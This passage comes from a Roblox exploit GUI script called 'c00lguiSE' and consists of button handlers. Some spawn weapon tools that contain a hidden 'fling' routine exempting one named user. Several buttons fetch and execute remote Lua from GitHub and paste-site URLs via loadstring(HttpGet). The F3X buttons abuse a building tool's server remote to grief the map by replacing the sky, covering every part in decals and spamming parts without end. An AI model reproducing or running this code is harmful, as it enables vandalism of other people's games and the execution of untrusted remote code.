			LoadedAnims.Equip:Play()
			LoadedAnims.Equip.Stopped:Connect(function()
				LoadedAnims.Idle:Play()
			end)
			tool.Activated:Connect(function()
				if not canAttack then return end
				canAttack = false
				activeHit = true
				LoadedAnims.Idle:Stop() 
				if attackState == 1 then
					SoundInstances.Slash.Pitch = 1
					SoundInstances.Slash:Play()
					LoadedAnims.Slash1:Play()
				elseif attackState == 2 then
					SoundInstances.Slash.Pitch = 1.17
					SoundInstances.Slash:Play()
					LoadedAnims.Slash2:Play()
				else
					SoundInstances.Lunge:Play()
					LoadedAnims.Lunge:Play()
				end
				attackState = attackState % 3 + 1
				wait(0.3)
				activeHit = false
				wait(0.3)
				canAttack = true
				LoadedAnims.Idle:Play()
			end)
		end)
	
		tool.Unequipped:Connect(function()
			LoadedAnims.Unequip:Play()
			LoadedAnims.Idle:Stop()
		end)
	
		k.Touched:Connect(function(n)
			if activeHit then
				local o = n.Parent:FindFirstChild("Humanoid")
				if o ~= nil then
					local p = game.Players:FindFirstChild(n.Parent.Name)
					for j = 1, 10 do
						if p.Name ~= "FunnyVideo15" then
							if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
								hiddenfling = true
							else
								hiddenfling = true
								local detection = Instance.new("Decal")
								detection.Name = "juisdfj0i32i0eidsuf0iok"
								detection.Parent = game:GetService("ReplicatedStorage")
								local function fling()
									local hrp, c, vel, movel = nil, nil, nil, 0.1
									while true do
										game:GetService("RunService").Heartbeat:Wait()
										if hiddenfling then
											local lp = game.Players.LocalPlayer
											while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
												game:GetService("RunService").Heartbeat:Wait()
												c = lp.Character
												hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
											end
											if hiddenfling then
												vel = hrp.Velocity
												hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
												game:GetService("RunService").RenderStepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel
												end
												game:GetService("RunService").Stepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel + Vector3.new(0, movel, 0)
													movel = movel * -1
												end
											end
										end
									end
								end
								fling()
							end
						end
					end
				end
			end
			wait(2)
			hiddenfling = false
		end)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_b0);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_b2()
local script = G2L["b2"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local UIS = game:GetService("UserInputService")
	
	function click()
		local plr = game.Players.LocalPlayer
		local tool = Instance.new("Tool", plr.Backpack)
		tool.GripPos = Vector3.new(0, 0, -2)
		tool.GripForward = Vector3.new(0, -1, 0)
		tool.GripRight = Vector3.new(1, 0, 0)
		tool.GripUp = Vector3.new(0, 0, 1)
		tool.Name = "Illumina"
		tool.ToolTip = "Telamon's favorite weapon from Sword Fight on the Heights."
		tool.TextureId = "rbxassetid://16620737"
		tool.RequiresHandle = true
		tool.CanBeDropped = true
	
		local k = Instance.new("Part", tool)
		k.Name = "Handle"
		k.Size = Vector3.new(1, 0.8, 6)
		k.BrickColor = BrickColor.new("Light stone grey")
		k.Anchored = false
		k.Reflectance = 0.7
		k.CanCollide = false
		
		local pl = Instance.new("PointLight", k)
		pl.Name = "IlluminaLight"
		pl.Enabled = true
		pl.Color = Color3.fromRGB(144, 25, 255)
		pl.Brightness = 5
		pl.Range = 5
		pl.Shadows = false
		
		local is = Instance.new("Sparkles", k)
		is.Name = "IlluminaSparkles"
		is.SparkleColor = Color3.fromRGB(255, 85, 255)
		is.TimeScale = 1
		is.Enabled = true
	
		local mesh = Instance.new("SpecialMesh", k)
		mesh.MeshId = "rbxasset://fonts/sword.mesh"
		mesh.Scale = Vector3.new(1.2, 1.2, 1.2)
	
		local Sounds = {
			Equip = "rbxasset://sounds//unsheath.wav",    
			Slash = "rbxasset://sounds//swordslash.wav",
			Lunge = "rbxasset://sounds//swordlunge.wav"    
		}
	
		local SoundInstances = {}
		for name, id in pairs(Sounds) do
			local sound = Instance.new("Sound", k)
			sound.SoundId = id
			sound.Volume = 1
			SoundInstances[name] = sound
		end
	
		local humanoid = plr.Character:WaitForChild("Humanoid")
	
		local Animations = humanoid.RigType == Enum.HumanoidRigType.R6 and {
			Equip = "rbxassetid://94160581",
			Unequip = "rbxassetid://94095929",
			Slash1 = "rbxassetid://94161088",
			Slash2 = "rbxassetid://94161333",
			Lunge = "rbxassetid://94160738",
			Idle = "rbxassetid://94108418"
		} or {
			Equip = "rbxassetid://852674878",
			Unequip = "rbxassetid://704173649",
			Slash1 = "rbxassetid://1442220193",
			Slash2 = "rbxassetid://2917200442",
			Lunge = "rbxassetid://674871189",
			Idle = "rbxassetid://3242546836"
		}
	
		local LoadedAnims = {}
		for name, id in pairs(Animations) do
			local anim = Instance.new("Animation")
			anim.AnimationId = id
			LoadedAnims[name] = humanoid:LoadAnimation(anim)
		end
	
		local attackState = 1
		local canAttack = true
		local lastClick = 0
		local doubleClickTime = 0.3
	
		local activatedConn
		local rightClickConn
	
		local function stopAllAnims()
			for _, track in pairs(LoadedAnims) do
				track:Stop()
			end
		end
	
		local function softLaunch()
			local root = plr.Character:FindFirstChild("HumanoidRootPart")
			if not root then return end
	
			local vel = Instance.new("BodyVelocity")
			vel.MaxForce = Vector3.new(100000, 100000, 100000)
	
			local moveDir = humanoid.MoveDirection
			if moveDir.Magnitude == 0 then
				moveDir = root.CFrame.LookVector
			end
	
			vel.Velocity = (moveDir.Unit * 45) + Vector3.new(0, 40, 0)
			vel.Parent = root
	
			game.Debris:AddItem(vel, 0.95)
		end
	
		local function doLunge()
			if not canAttack then return end
			canAttack = false
	
			SoundInstances.Lunge:Play()
			LoadedAnims.Lunge:Play()
			softLaunch()
	
			task.wait(0.5)
			canAttack = true
			LoadedAnims.Idle:Play()
		end
	
		tool.Equipped:Connect(function()
			attackState = 1
			canAttack = true
	
			SoundInstances.Equip:Play()
			LoadedAnims.Equip:Play()
	
			task.delay(0.4, function()
				if tool.Parent == plr.Character then
					LoadedAnims.Idle:Play()
				end
			end)
	
			activatedConn = tool.Activated:Connect(function()
				local now = tick()
	
				if now - lastClick <= doubleClickTime then
					doLunge()
					lastClick = 0
					return
				end
				lastClick = now
	
				if not canAttack then return end
				canAttack = false
	
				LoadedAnims.Idle:Stop()
	
				if attackState == 1 then
					SoundInstances.Slash:Play()
					LoadedAnims.Slash1:Play()
				elseif attackState == 2 then
					SoundInstances.Slash.Pitch = 1.17
					SoundInstances.Slash:Play()
					LoadedAnims.Slash2:Play()
				else
					doLunge()
				end
	
				attackState = attackState % 3 + 1
				task.wait(0.35)
				canAttack = true
				LoadedAnims.Idle:Play()
			end)
	
			rightClickConn = UIS.InputBegan:Connect(function(input, gp)
				if gp then return end
				if input.UserInputType == Enum.UserInputType.MouseButton2 then
					doLunge()
				end
			end)
		end)
	
		tool.Unequipped:Connect(function()
			stopAllAnims()
			LoadedAnims.Unequip:Play()
	
			if activatedConn then
				activatedConn:Disconnect()
			end
	
			if rightClickConn then
				rightClickConn:Disconnect()
			end
		end)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_b2);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_b4()
local script = G2L["b4"];
	local button = script.Parent
	
	button.MouseButton1Click:connect(function()
		local plr = game.Players.LocalPlayer
		local tool = Instance.new("Tool", plr.Backpack)
		tool.GripPos = Vector3.new(0, 0, -1.5)
		tool.GripForward = Vector3.new(0, -1, 0)
		tool.GripRight = Vector3.new(1, 0, 0)
		tool.GripUp = Vector3.new(0, 0, 1)
		tool.Name = "Punch"
		tool.TextureId = "rbxassetid://13050670424"
		tool.RequiresHandle = true
		tool.CanBeDropped = false
	
		local k = Instance.new("Part", tool)
		k.Name = "Handle"
		k.Size = Vector3.new(1, 0.8, 4)
		k.Anchored = false
		k.CanCollide = false
	
		local mesh = Instance.new("SpecialMesh", k)
		mesh.MeshId = ""
		mesh.TextureId = "" 
		mesh.Scale = Vector3.new(0, 0, 0) 
		mesh.Offset = Vector3.new(0, 0, 0)
		mesh.VertexColor = Vector3.new(1, 1, 1)
	
		local Unsheath = Instance.new("Sound", k)
		Unsheath.SoundId = ""
		Unsheath.Volume = 1
		Unsheath.TimePosition = 0
	
		local SwordSlash = Instance.new("Sound", k)
		SwordSlash.SoundId = "http://www.roblox.com/asset/?id=8595980577"
		SwordSlash.Volume = 1
		SwordSlash.TimePosition = 0
	
	
		local R6Anim = Instance.new("Animation", tool)
		R6Anim.AnimationId = "rbxassetid://204062532"
	
		local R15Anim = Instance.new("Animation", tool)
		R15Anim.AnimationId = "rbxassetid://1323151362"
	
		local humanoid = plr.Character:WaitForChild("Humanoid")
		local rigType = humanoid.RigType
		local activeAnim
	
		if rigType == Enum.HumanoidRigType.R15 then
			activeAnim = humanoid:LoadAnimation(R15Anim)
		else
			activeAnim = humanoid:LoadAnimation(R6Anim)
		end
	
		local db = true
		local da = false
	
		tool.Equipped:Connect(function()
			Unsheath:Play()
			wait(1)
			tool.Activated:Connect(function()
				if db == true then
					db = false
					SwordSlash:Play()
					activeAnim:Play()
					wait()
					da = true
					db = true
					wait(2)
					da = false
					activeAnim:Stop()
				end
			end)
		end)
	
		k.Touched:Connect(function(n)
			if da == true then
				local o = n.Parent:FindFirstChild("Humanoid")
				if o ~= nil then
					local p = game.Players:FindFirstChild(n.Parent.Name)
					for j = 1, 10 do
						if p.Name ~= "FunnyVideo15" then
							if game:GetService("ReplicatedStorage"):FindFirstChild("juisdfj0i32i0eidsuf0iok") then
								hiddenfling = true
							else
								hiddenfling = true
								local detection = Instance.new("Decal")
								detection.Name = "juisdfj0i32i0eidsuf0iok"
								detection.Parent = game:GetService("ReplicatedStorage")
	
								local function fling()
									local hrp, c, vel, movel = nil, nil, nil, 0.1
									while true do
										game:GetService("RunService").Heartbeat:Wait()
										if hiddenfling then
											local lp = game.Players.LocalPlayer
											while hiddenfling and not (c and c.Parent and hrp and hrp.Parent) do
												game:GetService("RunService").Heartbeat:Wait()
												c = lp.Character
												hrp = c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso")
											end
											if hiddenfling then
												vel = hrp.Velocity
												hrp.Velocity = vel * 10000 + Vector3.new(0, 10000, 0)
												game:GetService("RunService").RenderStepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel
												end
												game:GetService("RunService").Stepped:Wait()
												if c and c.Parent and hrp and hrp.Parent then
													hrp.Velocity = vel + Vector3.new(0, movel, 0)
													movel = movel * -1
												end
											end
										end
									end
								end
	
								fling()
							end
						end 
					end
				end 
			end
	
			wait(2)
			hiddenfling = false
		end)
	
	end)
	
end;
task.spawn(C_b4);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_b6()
local script = G2L["b6"];
	local button = script.Parent
	
	
	function click()
		if game.PlaceId == 3522803956 then -- Portal Stories Mel Portal Gun skin exclusive to the game, De Pride Isle Sanatorium, Eden Orphan Home, Equalia Falls Mental Insitute, Unit 1968, and Chicago 1949
			loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/Special%20Skin%202'))()
		elseif game.PlaceId == 4786930269 then 
			loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/Special%20Skin%202'))()
		elseif game.PlaceId == 3449573444 then 
			loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/Special%20Skin%202'))()
		elseif game.PlaceId == 746820961 then 
			loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/Special%20Skin%202'))()
		elseif game.PlaceId == 9675359772 then 
			loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/Special%20Skin%202'))()
		else
			loadstring(game:HttpGet('https://raw.githubusercontent.com/randomguy194/dollar-tree-portal-gun/main/Portal%20Gun'))()
		end
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_b6);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_b8()
local script = G2L["b8"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/skibicumrocket/piss-monster/refs/heads/main/telekines.txt'))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_b8);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_ba()
local script = G2L["ba"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_ba);
-- StarterGui.c00lguiSE.Main.Pages.Gears.Button.ButtonScript
local function C_bc()
local script = G2L["bc"];
	local button = script.Parent
	
	
	function click()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/infyiff/backup/refs/heads/main/f3x.lua"))()
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_bc);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_c0()
local script = G2L["c0"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color,
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function Sky(id)
			for _,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.Name == "Sky" then
					DestroyPart(v)
				end
			end
	
			e = char.HumanoidRootPart.CFrame.x
			f = char.HumanoidRootPart.CFrame.y
			g = char.HumanoidRootPart.CFrame.z
			CreatePart(CFrame.new(math.floor(e),math.floor(f),math.floor(g)) + Vector3.new(0,6,0),workspace)
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
					SetName(v,"Sky")
					AddMesh(v)
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
					MeshResize(v,Vector3.new(10000,10000,10000))
					SetLocked(v,true)
				end
			end
		end
	
		Sky(input.Text)
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_c0);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_c2()
local script = G2L["c2"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		function spam(id)
			for i,v in game.workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						SpawnDecal(v,Enum.NormalId.Front)
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
						AddDecal(v,id,Enum.NormalId.Back)
	
						SpawnDecal(v,Enum.NormalId.Right)
						AddDecal(v,id,Enum.NormalId.Right)
	
						SpawnDecal(v,Enum.NormalId.Left)
						AddDecal(v,id,Enum.NormalId.Left)
	
						SpawnDecal(v,Enum.NormalId.Bottom)
						AddDecal(v,id,Enum.NormalId.Bottom)
	
						SpawnDecal(v,Enum.NormalId.Top)
						AddDecal(v,id,Enum.NormalId.Top)
					end)
				end
			end 
		end
		spam(input.Text)
	
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_c2);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_c4()
local script = G2L["c4"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		--Script made by MERCY, credits to him! :D
		
		local player = game.Players.LocalPlayer
	
		local char = player.Character
	
		local tool
	
		for i,v in player:GetDescendants() do
	
			if v.Name == "SyncAPI" then		tool = v.Parent
	
			end
	
		end
	
		for i,v in game.ReplicatedStorage:GetDescendants() do
	
			if v.Name == "SyncAPI" then
	
				tool = v.Parent
	
			end
	
		end
	
		local remote = tool.SyncAPI.ServerEndpoint
	
		function _(args)
	
			remote:InvokeServer(unpack(args))
	
		end
	
		function SetCollision(part,boolean)
	
			local args = {
	
				[1] = "SyncCollision",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["CanCollide"] = boolean
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function SetAnchor(boolean,part)
	
			local args = {
	
				[1] = "SyncAnchor",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["Anchored"] = boolean
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function CreatePart(cf,parent)
	
			local args = {
	
				[1] = "CreatePart",
	
				[2] = "Normal",
	
				[3] = cf,
	
				[4] = parent
	
			}
	
			_(args)
	
		end
	
		function DestroyPart(part)
	
			local args = {
	
				[1] = "Remove",
	
				[2] = {
	
					[1] = part
	
				}
	
			}
	
			_(args)
	
		end
	
		function MovePart(part,cf)
	
			local args = {
	
				[1] = "SyncMove",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["CFrame"] = cf
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function Resize(part,size,cf)
	
			local args = {
	
				[1] = "SyncResize",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["CFrame"] = cf,
	
						["Size"] = size
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function AddMesh(part)
	
			local args = {
	
				[1] = "CreateMeshes",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function SetMesh(part,meshid)
	
			local args = {
	
				[1] = "SyncMesh",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["MeshId"] = "rbxassetid://"..meshid
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function SetTexture(part, texid)
	
			local args = {
	
				[1] = "SyncMesh",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["TextureId"] = "rbxassetid://"..texid
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function SetName(part, stringg)
	
			local args = {
	
				[1] = "SetName",
	
				[2] = {
	
					[1] = part
	
				},
	
				[3] = stringg
	
			}
	
			_(args)
	
		end
	
		function MeshResize(part,size)
	
			local args = {
	
				[1] = "SyncMesh",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["Scale"] = size
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function Weld(part1, part2,lead)
	
			local args = {
	
				[1] = "CreateWelds",
	
				[2] = {
	
					[1] = part1,
	
					[2] = part2
	
				},
	
				[3] = lead
	
			}
	
			_(args)
	
		end
	
		function SetLocked(part,boolean)
	
			local args = {
	
				[1] = "SetLocked",
	
				[2] = {
	
					[1] = part
	
				},
	
				[3] = boolean
	
			}
	
			_(args)
	
		end
	
		function SetTrans(part,int)
	
			local args = {
	
				[1] = "SyncMaterial",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["Transparency"] = int
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function CreateSpotlight(part)
	
			local args = {
	
				[1] = "CreateLights",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["LightType"] = "SpotLight"
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function SyncLighting(part,brightness)
	
			local args = {
	
				[1] = "SyncLighting",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["LightType"] = "SpotLight",
	
						["Brightness"] = brightness
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function Color(part,color)
	
			local args = {
	
				[1] = "SyncColor",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["Color"] = color,
	
						["UnionColoring"] = false
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function SpawnDecal(part,side)
	
			local args = {
	
				[1] = "CreateTextures",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["Face"] = side,
	
						["TextureType"] = "Decal"
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		function AddDecal(part,asset,side)
	
			local args = {
	
				[1] = "SyncTexture",
	
				[2] = {
	
					[1] = {
	
						["Part"] = part,
	
						["Face"] = side,
	
						["TextureType"] = "Decal",
	
						["Texture"] = "rbxassetid://".. asset
	
					}
	
				}
	
			}
	
			_(args)
	
		end
	
		-- ðŸ”¹ Tambahan: daftar 3 ID decal
	
		local ids = {
	
			input.Text, -- ID 1
	
			input.Text, -- ID 2
	
			input.Text  -- ID 3
	
		}
	
		while wait(0.1) do
	
			spawn(function()
	
				local e = char.HumanoidRootPart.CFrame.x + math.random(-100, 100)
	
				local f = char.HumanoidRootPart.CFrame.y
	
				local g = char.HumanoidRootPart.CFrame.z + math.random(-100, 100)
	
				CreatePart(CFrame.new(math.floor(e), math.floor(f), math.floor(g)) + Vector3.new(0,6,0), workspace)
	
				for i,v in game.Workspace:GetDescendants() do
	
					if v:IsA("BasePart") and v.CFrame.x == math.floor(e) and v.CFrame.z == math.floor(g) then
	
						SetName(v,"particle")
	
						-- ðŸ”¹ pilih salah satu ID acak dari daftar di atas
	
						local id = ids[math.random(1, #ids)]
	
						SpawnDecal(v,Enum.NormalId.Front)
	
						AddDecal(v,id,Enum.NormalId.Front)
	
						SpawnDecal(v,Enum.NormalId.Back)
	
						AddDecal(v,id,Enum.NormalId.Back)
	
						SetTrans(v,1)
	
						Resize(v,Vector3.new(7,7,0.1),v.CFrame)
	
						SetLocked(v,true)
	
						while wait(0.01) do
	
							MovePart(v,CFrame.new(v.CFrame.x,v.CFrame.y + 3,v.CFrame.z))
	
						end
	
					end
	
				end
	
			end)
	
		end
	end
	
	button.MouseButton1Click:Connect(click)
	
end;
task.spawn(C_c4);
-- StarterGui.c00lguiSE.Main.Pages.F3X.Button.ButtonScript
local function C_c6()
local script = G2L["c6"];
	local button = script.Parent
	local tweenservice = game:GetService("TweenService")
	local input = button.Parent.Parent.Settings.AssetInput
	
	
	function click()
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
